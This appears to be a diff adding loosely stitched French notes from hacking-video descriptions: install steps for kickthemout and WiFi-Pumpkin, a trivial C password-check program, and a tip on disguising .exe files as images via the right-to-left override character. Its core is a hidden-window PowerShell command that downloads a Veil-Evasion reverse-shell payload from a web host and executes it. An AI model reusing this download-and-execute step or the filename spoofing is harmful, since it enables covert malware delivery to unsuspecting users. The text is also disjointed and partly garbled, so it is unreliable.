@@ -1,0 +1,79 @@
+sudo apt-get update && sudo apt-get install nmap
+git clone https://github.com/k4m4/kickthemout.git
+cd kickthemout/
+sudo -H pip3 install -r requirements.txt
+ sudo python3 kickthemout.py
+
+
+
+un.bat malveillant= un pc
+
+Salut tout le monde ! 
+Aujourd'hui on se retrouve pour la création d'un payload  (un reverse_tcp). Je l'ai upload sur un hébergeur web puis download avec un script powershell :) Bref : 
+
+Logiciel utilisé : Veil-Evasion
+Script Powershell pour Download & Execute :
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('Votre Site web','%TEMP%\NomProc.exe'); Start-Process "%TEMP%\NomProc.exe" 
+
+Client FTP Linux (Terminal) pas de software.
+BUT ÉDUCATIF UNIQUEMENT. 
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main (int argc, char **argv)
+{
+    int  valeur;
+
+    if (argc < 2) //Si vous entrer pas le mdp bah on f1
+    {
+        fprintf (stderr, "Erreur manque un argument %s chaine1 chaine2\n", argv[0]); //
+        return EXIT_FAILURE; //On sort du programme.
+    }
+
+    valeur = strcmp (argv[1],"youtubePassword"); //Comparaison avec le password.
+
+        if (valeur == 0) // Si valeur = 0, signifie que le mdp rentré est correct.
+        printf ("'%s' Bravo ! vous avez le bon mdp ! elf cracké :) \n", argv[1]); // affiche du texte (Réussite)
+        else 
+        printf ("Pas le bon mdp essaye encore ! '%s'.\n", argv[1]); // Affiche du texte (Echecs)
+
+    return EXIT_SUCCESS; //on sort du programme.
+}
+
+
+
+
+
+
+
+
+
+
+
+#3:
+Aujourd'hui on se retrouve pour une petite vidéo sur les extensions. On va modifié les extensions afin de lancer un .jpg .png .pdf etc... en tant que éxécutable (.exe).  Grâce au caractere unicode →Right to left Override Soit U+202E
+Bonne vidéo !
+
+#5
+ git clone https://github.com/P0cL4bs/WiFi-Pumpkin.git
+ cd WiFi-Pumpkin
+ ./installer.sh --install
+
+or download .deb file to install
+
+sudo dpkg -i wifi-pumpkin-0.8.8-all.deb
+sudo apt-get -f install # force install dependencies if not install normally
+
+
+
+############################################################################
+
+🖼️ Credit :
+
+- License Flaticon : gravenilvec@gmail.com (GravenDev)
+- IStockPhotos : gravenilvec@gmail.com
+
+🎥 Logiciels:3333333################################################################
